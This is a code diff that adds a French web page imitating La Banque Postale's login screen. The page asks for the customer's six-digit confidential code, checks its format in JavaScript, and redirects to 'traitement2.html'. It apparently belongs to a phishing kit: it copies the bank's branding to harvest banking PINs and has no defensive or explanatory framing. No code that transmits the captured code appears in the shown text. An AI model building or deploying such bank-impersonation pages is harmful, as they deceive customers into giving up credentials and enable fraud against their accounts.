@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>La Banque Postale - Mot de passe</title>
+    <style>
+        :root {
+            --lbp-blue: #005BA3;
+            --lbp-light-blue: #0072CE;
+            --lbp-white: #FFFFFF;
+            --lbp-gray: #F5F5F5;
+            --lbp-border: #DDDDDD;
+            --lbp-radius: 8px;
+            --lbp-space-sm: 16px;
+            --lbp-space-md: 24px;
+            --lbp-space-lg: 32px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: var(--lbp-blue);
+            color: var(--lbp-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .lbp-header {
+            background-color: var(--lbp-blue);
+            padding: var(--lbp-space-sm);
+        }
+
+        .lbp-logo {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        .lbp-main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: var(--lbp-space-md);
+            text-align: center;
+        }
+
+        .lbp-form-container {
+            background-color: var(--lbp-white);
+            border-radius: var(--lbp-radius);
+            padding: var(--lbp-space-lg);
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .lbp-form-title {
+            color: var(--lbp-blue);
+            margin-bottom: var(--lbp-space-md);
+            font-size: 22px;
+        }
+
+        .lbp-input-group {
+            margin-bottom: var(--lbp-space-md);
+            text-align: left;
+        }
+
+        .lbp-input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--lbp-blue);
+            font-weight: 500;
+        }
+
+        .lbp-input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--lbp-border);
+            border-radius: var(--lbp-radius);
+            font-size: 16px;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+
+        .lbp-input-field:focus {
+            outline: none;
+            border-color: var(--lbp-blue);
+        }
+
+        .lbp-submit-button {
+            background-color: var(--lbp-blue);
+            color: var(--lbp-white);
+            border: none;
+            border-radius: 50px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: var(--lbp-space-sm);
+            transition: background-color 0.3s;
+        }
+
+        .lbp-submit-button:hover {
+            background-color: var(--lbp-light-blue);
+        }
+
+        .lbp-error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .lbp-forgot-password {
+            margin-top: var(--lbp-space-sm);
+            text-align: center;
+        }
+
+        .lbp-forgot-password a {
+            color: var(--lbp-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .lbp-forgot-password a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header class="lbp-header">
+        <img src="Logo_La_Banque_postale_2022.svg.png" alt="La Banque Postale" class="lbp-logo">
+    </header>
+
+    <main class="lbp-main">
+        <div class="lbp-form-container">
+            <h1 class="lbp-form-title">Entrez votre mot de passe</h1>
+            
+            <div class="lbp-input-group">
+                <label for="password" class="lbp-input-label">Code confidentiel (6 chiffres)</label>
+                <input type="password" id="password" class="lbp-input-field" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
+                <div id="error-message" class="lbp-error-message">Veuillez entrer un code à 6 chiffres</div>
+            </div>
+            
+            <button id="submit-btn" class="lbp-submit-button">Valider</button>
+            
+            <div class="lbp-forgot-password">
+                <a href="#">Code confidentiel oublié ?</a>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submit-btn');
+            const errorMessage = document.getElementById('error-message');
+
+            submitBtn.addEventListener('click', function() {
+                const password = passwordInput.value.trim();
+                
+                // Vérification que le mot de passe contient exactement 6 chiffres
+                if (/^\d{6}$/.test(password)) {
+                    // Redirection vers traitement2.html
+                    window.location.href = 'traitement2.html';
+                } else {
+                    // Afficher le message d'erreur
+                    errorMessage.style.display = 'block';
+                    passwordInput.focus();
+                }
+            });
+
+            // Masquer le message d'erreur quand l'utilisateur commence à taper
+            passwordInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+            });
+
+            // Optionnel : Masquer/Afficher le mot de passe
+            passwordInput.addEventListener('keydown', function(e) {
+                // Empêcher l'entrée de caractères non numériques
+                if (e.key.length === 1 && !/\d/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+
+            // Permettre la validation avec la touche Entrée
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
